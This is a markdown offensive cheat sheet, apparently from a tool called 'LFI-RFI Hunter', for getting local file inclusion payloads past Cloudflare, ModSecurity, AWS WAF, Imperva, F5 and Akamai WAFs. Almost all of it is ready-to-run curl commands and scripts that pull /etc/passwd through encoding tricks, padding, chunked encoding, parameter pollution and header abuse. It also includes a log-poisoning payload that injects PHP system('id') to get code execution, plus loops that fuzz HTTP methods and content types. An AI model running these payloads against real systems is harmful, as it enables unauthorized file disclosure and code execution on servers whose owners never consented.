# LFI-RFI Hunter — WAF Bypass & Evasion Master Reference
# Updated with 2025-2026 techniques: padding attack, chunked encoding,
# parser discrepancy, HTTP/2 smuggling, polyglot, and 15+ WAF-specific bypasses.

## Technique Matrix

| # | Technique | Works Against | Example |
|---|-----------|--------------|---------|
| 1 | Double encoding | WAF, basic filters | `..%252f..%252f..%252fetc%252fpasswd` |
| 2 | Triple encoding | ModSecurity, AWS WAF | `%25252e%25252e%25252fetc%25252fpasswd` |
| 3 | Overlong UTF-8 | IIS, Tomcat, Cloudflare | `..%c0%af..%c0%afetc%c0%afpasswd` |
| 4 | UTF-16/Unicode | Akamai, F5 | `%u002e%u002e%u2215etc%u2215passwd` |
| 5 | ..././ bypass | Dot-dot-strip filters | `..././..././etc/passwd` |
| 6 | ....// bypass | ../ replacement filters | `....//....//etc/passwd` |
| 7 | Semicolon | Java/Tomcat path norm | `/..;/..;/..;/etc/passwd` |
| 8 | Null byte | PHP < 5.3.4 | `../../../etc/passwd%00` |
| 9 | Query string | Extension appending | `../../../etc/passwd?` |
| 10 | Fragment | Extension filters | `../../../etc/passwd#` |
| 11 | Absolute path | ../ filtering | `/etc/passwd` |
| 12 | Double slash | Basic ../ removal | `////etc/passwd` |
| 13 | Mixed slash | Cross-platform | `..\/..\/..\/etc/passwd` |
| 14 | Truncation | PHP < 5.3 | 4096-char path |
| 15 | Jolokia ! delimiter | Jolokia/JMX | `!..!..!..!etc!passwd` |
| 16 | Apache %3f bypass | Apache rewrite rules | `/path%3F../../etc/passwd` |
| 17 | Nginx alias | Nginx alias misconfig | `/files../etc/passwd` |
| 18 | Case variation | Windows normalization | `..\..\WINDOWS\win.ini` |
| 19 | Full-width chars | WAF charset filters | `．．／．．／etc／passwd` |
| 20 | Base64 payload | Custom WAF rules | `Li4vLi4vLi4vZXRjL3Bhc3N3ZA==` |
| 21 | Payload padding | Cloudflare, Akamai | Pad to 8KB+ with junk data |
| 22 | Chunked encoding | Cloudflare | `Transfer-Encoding: chunked` |
| 23 | HTTP/2 smuggling | F5, AWS WAF | HTTP/2 downgrade confusion |
| 24 | Parameter pollution | Imperva, ModSecurity | `?file=valid&file=../../../etc/passwd` |
| 25 | Polyglot payloads | ML-based WAFs | Combine SQL + LFI + XSS |
| 26 | Content-Type switch | WAF content parsers | JSON → XML → form-urlencoded |
| 27 | Method switch | WAF per-method rules | GET → POST → PUT → PATCH |
| 28 | Header injection | WAF header filters | `X-Original-URL`, `X-Rewrite-URL` |
| 29 | PHP filter chain | All WAFs (no payload) | Synacktiv chain via php://temp |
| 30 | Log poisoning | All WAFs (log file) | Inject PHP in UA → include log |

## WAF-Specific Bypass Strategies

### Cloudflare WAF Bypass
```bash
# 1. Payload size padding (Free: 8KB limit, Enterprise: 128KB)
# Pad the request body with benign data to push payload beyond inspection
curl -sk -X POST \
  -d "file=../../../etc/passwd&junk=$(python3 -c 'print("A"*10000)')" \
  "https://TARGET/"

# 2. Chunked Transfer Encoding
curl -sk -H "Transfer-Encoding: chunked" \
  "https://TARGET/page=../../../etc/passwd"

# 3. HTTP/2 (bypasses some HTTP/1.1 rules)
curl -sk --http2 "https://TARGET/page=../../../etc/passwd"

# 4. POST with JSON body instead of GET
curl -sk -X POST \
  -H "Content-Type: application/json" \
  -d '{"file":"../../../etc/passwd"}' \
  "https://TARGET/api"

# 5. Overlong UTF-8 encoding
curl -sk "https://TARGET/page=..%c0%af..%c0%afetc%c0%afpasswd"

# 6. Tab character injection
curl -sk "https://TARGET/page=../../%09../../etc/passwd"

# 7. Cloudflare parsing discrepancy (%u encoding)
curl -sk "https://TARGET/page=%u002e%u002e/%u002e%u002e/etc/passwd"

# 8. Parameter pollution (Cloudflare inspects first occurrence only)
curl -sk "https://TARGET/page=valid&page=../../../etc/passwd"

# 9. Use mobile User-Agent
curl -sk -H "User-Agent: Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36" \
  "https://TARGET/page=../../../etc/passwd"

# 10. Use different HTTP method
curl -sk -X PUT "https://TARGET/page=../../../etc/passwd"
curl -sk -X PATCH "https://TARGET/page=../../../etc/passwd"

# 11. Protocol-relative URL (bypasses hostname checks)
curl -sk "https://TARGET/page=//etc/passwd"
```

### ModSecurity / OWASP CRS Bypass
```bash
# 1. Null byte prefix
curl -sk "https://TARGET/page=%00../../../etc/passwd"

# 2. Double parameter (ModSecurity sees first, app uses last)
curl -sk "https://TARGET/page=valid.txt&page=../../../etc/passwd"

# 3. Path normalization attacks
curl -sk "https://TARGET/page=/etc/passwd"
curl -sk "https://TARGET/page=....//....//....//etc/passwd"

# 4. Multibyte encoding bypass
curl -sk "https://TARGET/page=..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fpasswd"

# 5. Request line obfuscation via space injection
curl -sk -X "GET /page=../../../etc/passwd HTTP/1.0" "https://TARGET/"

# 6. Use Transfer-Encoding to split payload
curl -sk -H "Transfer-Encoding: chunked" \
  -d "page=../../../etc/passwd" "https://TARGET/"

# 7. Parameter name case confusion
curl -sk "https://TARGET/Page=../../../etc/passwd"
curl -sk "https://TARGET/PAGE=../../../etc/passwd"

# 8. Protocol handler (ModSecurity may not inspect file://)
curl -sk "https://TARGET/page=file:///etc/passwd"
```

### AWS WAF Bypass
```bash
# 1. Triple URL encoding
curl -sk "https://TARGET/page=%25252e%25252e%25252fetc%25252fpasswd"

# 2. Mixed encoding levels
curl -sk "https://TARGET/page=%2e%2e%252f%2e%2e%252fetc%252fpasswd"

# 3. JSON body injection
curl -sk -X POST -H "Content-Type: application/json" \
  -d '{"file":"../../../etc/passwd"}' "https://TARGET/api"

# 4. Case variation
curl -sk "https://TARGET/page=../../ETC/PASSWD"

# 5. Base64 encoded payload (if app decodes server-side)
curl -sk "https://TARGET/page=Li4vLi4vLi4vZXRjL3Bhc3N3ZA=="

# 6. Use X-Forwarded-For to bypass IP-based rules
curl -sk -H "X-Forwarded-For: 127.0.0.1" \
  "https://TARGET/page=../../../etc/passwd"
```

### Imperva WAF Bypass
```bash
# 1. Polyglot payload — combine LFI with other content types
curl -sk "https://TARGET/page=<html><img src=x>../../../etc/passwd"

# 2. HTTP Parameter Pollution (HPP)
curl -sk "https://TARGET/?page=../../../etc/passwd&page=valid.txt"
curl -sk "https://TARGET/?page=valid.txt&page=../../../etc/passwd"

# 3. Case normalization bypass (UTF-16)
curl -sk "https://TARGET/page=%uff0e%uff0e%u2215%uff0e%uff0e%u2215etc%u2215passwd"

# 4. Use semicolon for Java/Tomcat
curl -sk "https://TARGET/page=..;/..;/..;/etc/passwd"
```

### F5 BIG-IP ASM Bypass
```bash
# 1. HTTP/2 downgrade confusion
curl -sk --http2-prior-knowledge "https://TARGET/page=../../../etc/passwd"

# 2. Path separator mixing (F5 normalizes differently)
curl -sk "https://TARGET/page=..\\/..\\/..\\/etc/passwd"

# 3. Null byte + double encoding
curl -sk "https://TARGET/page=..%252f..%252fetc%252fpasswd%2500"

# 4. Chunked encoding + trailer
curl -sk -H "Transfer-Encoding: chunked" \
  -H "Trailer: X-Real-IP" \
  -d $'5\r\npage=../../..\r\n0\r\nX-Real-IP: ../../etc/passwd\r\n' \
  "https://TARGET/"
```

### Akamai WAF Bypass
```bash
# 1. Unicode normalization bypass
curl -sk "https://TARGET/page=%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd"

# 2. Full-width character injection
curl -sk "https://TARGET/page=%ef%bc%8f%ef%bc%8f%ef%bc%8fetc%ef%bc%8fpasswd"

# 3. Cookie-based bypass
curl -sk -H "Cookie: PHPSESSID=../../../etc/passwd" \
  "https://TARGET/page=test"

# 4. HTTP/0.9 style request
printf "GET /page=../../../etc/passwd\r\n" | nc TARGET 443
```

## Generic Bypass Order of Operations

When direct `../../../etc/passwd` is blocked, try in this order:

```
Step 1:  Try absolute path
Step 2:  Try double URL encoding
Step 3:  Try overlong UTF-8 (%c0%af)
Step 4:  Try Unicode / UTF-16 (%u002e)
Step 5:  Try semicolon (Java/Spring apps)
Step 6:  Try PHP wrappers (php://filter)
Step 7:  Try query string + fragment bypass
Step 8:  Try tab/space injection (%09/%20)
Step 9:  Try protocol handler (file:///)
Step 10: Try PHP filter chain (Synacktiv generator)
Step 11: Try log poisoning (UA injection → include log)
Step 12: Try payload padding (8KB+ junk)
Step 13: Try chunked transfer encoding
Step 14: Try HTTP method switching
Step 15: Try Content-Type switching
Step 16: Try parameter pollution
Step 17: Try HTTP/2
Step 18: Try base64-encoded path
Step 19: Try full-width characters
Step 20: Try header-based bypass (X-Original-URL)
```

## Payload Padding Attack (2026 Technique)

Modern WAFs inspect only first 8KB-128KB. Pad payloads to bypass:

```bash
# Bash one-liner: pad payload to 10KB
PAYLOAD="../../../etc/passwd"
JUNK=$(python3 -c "print('A'*10000)")
curl -sk "https://TARGET/page=${PAYLOAD}%00${JUNK}"

# Python script for padding attack
python3 -c "
import requests
junk = 'A' * 10240  # 10KB padding
url = 'https://TARGET/page=../../../etc/passwd%00' + junk
r = requests.get(url)
print(r.text if 'root:x' in r.text else 'Blocked')
"

# Pad request body, not URL
curl -sk -X POST \
  -d "page=../../../etc/passwd&padding=$(python3 -c "print('x'*16384)")" \
  "https://TARGET/"
```

## Header-Based Bypasses

```bash
# X-Original-URL (common in reverse proxies)
curl -sk -H "X-Original-URL: /page=../../../etc/passwd" "https://TARGET/"
curl -sk -H "X-Original-URL: /admin" "https://TARGET/page=../../../etc/passwd"

# X-Rewrite-URL
curl -sk -H "X-Rewrite-URL: /page=../../../etc/passwd" "https://TARGET/"

# X-Forwarded-Host
curl -sk -H "X-Forwarded-Host: ../../../etc/passwd" "https://TARGET/"

# Referer header injection (for log poisoning + WAF bypass)
curl -sk -H "Referer: <?php system('id'); ?>" \
  "https://TARGET/page=../../../var/log/apache2/access.log&c=id"
```

## Content-Type Switching

```bash
# Try ALL content types
for ct in \
  "application/x-www-form-urlencoded" \
  "application/json" \
  "application/xml" \
  "text/plain" \
  "multipart/form-data" \
  "application/x-www-form-urlencoded; charset=utf-8"; do
  curl -sk -X POST -H "Content-Type: $ct" \
    -d "page=../../../etc/passwd" "https://TARGET/"
done
```

## HTTP Method Fuzzing

```bash
for method in GET POST PUT PATCH DELETE OPTIONS HEAD; do
  curl -sk -X $method "https://TARGET/page=../../../etc/passwd" \
    | grep -q "root:x" && echo "VULN with $method"
done
```
